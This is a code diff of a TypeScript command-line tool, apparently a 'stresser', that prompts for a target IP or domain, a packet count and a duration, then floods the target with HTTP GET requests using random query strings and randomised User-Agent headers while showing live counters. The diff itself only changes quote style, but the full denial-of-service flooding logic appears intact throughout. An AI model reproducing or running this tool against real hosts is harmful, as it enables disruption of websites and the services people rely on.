@@ -1,11 +1,11 @@
-import Dayjs from "dayjs";
-import DayjsDuration from "dayjs/plugin/duration";
+import Dayjs from 'dayjs';
+import DayjsDuration from 'dayjs/plugin/duration';
 Dayjs.extend(DayjsDuration);
-import RandomUA from "random-useragent";
-import Kindof from "kind-of";
-import Readline from "readline";
+import RandomUA from 'random-useragent';
+import Kindof from 'kind-of';
+import Readline from 'readline';
 
-import Package from "../package.json";
+import Package from '../package.json';
 
 const rl = Readline.createInterface({
   input: process.stdin,
@@ -17,15 +17,15 @@ const intervals: Record<string, NodeJS.Timeout> = {};
 const print = () => {
   console.clear();
 
-  console.log("\n");
-  console.log("    \x1b[90m #####   ######   #####    #####    #####    #####", "\x1b[0m");
-  console.log("    \x1b[90m##         ##     ##  ##   ##      ##       ##", "\x1b[0m");
-  console.log("    \x1b[90m ####      ##     #####    ####     ####     ####", "\x1b[0m");
-  console.log("    \x1b[90m    ##     ##     ##  ##   ##          ##       ##", "\x1b[0m");
-  console.log("    \x1b[90m#####      ##     ##  ##   #####   #####    #####", "\x1b[0m");
-  console.log("");
-  console.log(`                                                   \x1b[37mv${Package.version}`, "\x1b[0m");
-  console.log("");
+  console.log('\n');
+  console.log('    \x1b[90m #####   ######   #####    #####    #####    #####', '\x1b[0m');
+  console.log('    \x1b[90m##         ##     ##  ##   ##      ##       ##', '\x1b[0m');
+  console.log('    \x1b[90m ####      ##     #####    ####     ####     ####', '\x1b[0m');
+  console.log('    \x1b[90m    ##     ##     ##  ##   ##          ##       ##', '\x1b[0m');
+  console.log('    \x1b[90m#####      ##     ##  ##   #####   #####    #####', '\x1b[0m');
+  console.log('');
+  console.log(`                                                   \x1b[37mv${Package.version}`, '\x1b[0m');
+  console.log('');
 };
 
 const question = (query: string): Promise<string> =>
@@ -36,18 +36,18 @@ const question = (query: string): Promise<string> =>
 const run = async () => {
   print();
 
-  const target_question = await question("Target (IP/Domain): ");
+  const target_question = await question('Target (IP/Domain): ');
 
   print();
 
   const target: string = target_question
     .toLowerCase()
     .trim()
-    .replace(/^https?:\/\//, "")
-    .split("/")[0];
+    .replace(/^https?:\/\//, '')
+    .split('/')[0];
 
   if (!target) {
-    console.log("Field target cannot be left blank.");
+    console.log('Field target cannot be left blank.');
 
     setTimeout(() => void run(), 2500);
 
@@ -55,8 +55,8 @@ const run = async () => {
   }
 
   // eslint-disable-next-line @typescript-eslint/no-unnecessary-condition
-  if (Kindof(target) !== "string") {
-    console.log("Field target must be a string.");
+  if (Kindof(target) !== 'string') {
+    console.log('Field target must be a string.');
 
     setTimeout(() => void run(), 2500);
 
@@ -65,12 +65,12 @@ const run = async () => {
 
   console.log(`Target (IP/Domain): ${target}`);
 
-  const ppt_question: string = await question("PPT (Packets Per Transaction): ");
+  const ppt_question: string = await question('PPT (Packets Per Transaction): ');
 
   print();
 
   if (!ppt_question) {
-    console.log("Field ppt cannot be left blank.");
+    console.log('Field ppt cannot be left blank.');
 
     setTimeout(() => void run(), 2500);
 
@@ -78,7 +78,7 @@ const run = async () => {
   }
 
   if (isNaN(Number(ppt_question))) {
-    console.log("Field ppt must be a number.");
+    console.log('Field ppt must be a number.');
 
     setTimeout(() => void run(), 2500);
 
@@ -90,12 +90,12 @@ const run = async () => {
   console.log(`Target (IP/Domain): ${target}`);
   console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
 
-  const duration_question: string = await question("Duration (s): ");
+  const duration_question: string = await question('Duration (s): ');
 
   print();
 
   if (!duration_question) {
-    console.log("Field duration cannot be left blank.");
+    console.log('Field duration cannot be left blank.');
 
     setTimeout(() => void run(), 2500);
 
@@ -103,7 +103,7 @@ const run = async () => {
   }
 
   if (isNaN(Number(duration_question))) {
-    console.log("Field duration must be a number.");
+    console.log('Field duration must be a number.');
 
     setTimeout(() => void run(), 2500);
 
@@ -116,13 +116,13 @@ const run = async () => {
   console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
   console.log(`Duration (s): ${duration.toString()}`);
 
-  console.log("");
-  console.log("Status                       \x1b[33mPreparing... ⟳", "\x1b[0m");
-  console.log("Packets Sent                 \x1b[90m--", "\x1b[0m");
-  console.log("Successful Resp.             \x1b[90m--", "\x1b[0m");
-  console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m");
-  console.log("Remaining Time               \x1b[90m--", "\x1b[0m");
-  console.log("");
+  console.log('');
+  console.log('Status                       \x1b[33mPreparing... ⟳', '\x1b[0m');
+  console.log('Packets Sent                 \x1b[90m--', '\x1b[0m');
+  console.log('Successful Resp.             \x1b[90m--', '\x1b[0m');
+  console.log('Unsuccessful Resp.           \x1b[90m--', '\x1b[0m');
+  console.log('Remaining Time               \x1b[90m--', '\x1b[0m');
+  console.log('');
 
   await Bun.sleep(1000);
 
@@ -132,14 +132,14 @@ const run = async () => {
   console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
   console.log(`Duration (s): ${duration.toString()}`);
 
-  console.log("");
-  console.log("Status                       \x1b[33mAlmost Ready... ⟳", "\x1b[0m");
-  console.log("Packets Sent                 \x1b[90m--", "\x1b[0m");
-  console.log("Successful Resp.             \x1b[90m--", "\x1b[0m");
-  console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m");
-  console.log("Remaining Time               \x1b[90m--", "\x1b[0m");
+  console.log('');
+  console.log('Status                       \x1b[33mAlmost Ready... ⟳', '\x1b[0m');
+  console.log('Packets Sent                 \x1b[90m--', '\x1b[0m');
+  console.log('Successful Resp.             \x1b[90m--', '\x1b[0m');
+  console.log('Unsuccessful Resp.           \x1b[90m--', '\x1b[0m');
+  console.log('Remaining Time               \x1b[90m--', '\x1b[0m');
 
-  console.log("");
+  console.log('');
 
   await Bun.sleep(2500);
 
@@ -154,9 +154,9 @@ const run = async () => {
       packets_sent++;
 
       fetch(`http://${target}?${Math.random().toString()}=${Math.random().toString()}`, {
-        method: "GET",
+        method: 'GET',
         headers: {
-          "User-Agent": RandomUA.getRandom()
+          'User-Agent': RandomUA.getRandom()
         }
       })
         .then((response) => {
@@ -180,14 +180,14 @@ const run = async () => {
     console.log(`PPT (Packets Per Transaction): ${ppt.toString()}`);
     console.log(`Duration (s): ${duration.toString()}`);
 
-    console.log("");
-    console.log(`Status                       ${running ? "\x1b[37mRunning ▶" : "\x1b[31mStopped ■"}`, "\x1b[0m");
-    console.log(`Packets Sent                 ${previous_packets_sent !== packets_sent ? "\x1b[34m" : "\x1b[90m"}${packets_sent.toString()} ↑`, "\x1b[0m");
-    console.log(`Successful Resp.             ${previous_successful_responses !== successful_responses ? "\x1b[32m" : "\x1b[90m"}${successful_responses.toString()} ↓`, "\x1b[0m");
-    console.log(`Unsuccessful Resp.           ${previous_unsuccessful_responses !== unsuccessful_responses ? "\x1b[31m" : "\x1b[90m"}${unsuccessful_responses.toString()} ⇣`, "\x1b[0m");
-    console.log(`Remaining Time               ${previous_remaining_time !== remaining_time ? "\x1b[33m" : "\x1b[90m"}${Dayjs.duration(remaining_time, "seconds").format("HH:mm:ss")} ⏱︎`, "\x1b[0m");
+    console.log('');
+    console.log(`Status                       ${running ? '\x1b[37mRunning ▶' : '\x1b[31mStopped ■'}`, '\x1b[0m');
+    console.log(`Packets Sent                 ${previous_packets_sent !== packets_sent ? '\x1b[34m' : '\x1b[90m'}${packets_sent.toString()} ↑`, '\x1b[0m');
+    console.log(`Successful Resp.             ${previous_successful_responses !== successful_responses ? '\x1b[32m' : '\x1b[90m'}${successful_responses.toString()} ↓`, '\x1b[0m');
+    console.log(`Unsuccessful Resp.           ${previous_unsuccessful_responses !== unsuccessful_responses ? '\x1b[31m' : '\x1b[90m'}${unsuccessful_responses.toString()} ⇣`, '\x1b[0m');
+    console.log(`Remaining Time               ${previous_remaining_time !== remaining_time ? '\x1b[33m' : '\x1b[90m'}${Dayjs.duration(remaining_time, 'seconds').format('HH:mm:ss')} ⏱︎`, '\x1b[0m');
 
-    console.log("");
+    console.log('');
 
     previous_packets_sent = packets_sent;
     previous_successful_responses = successful_responses;
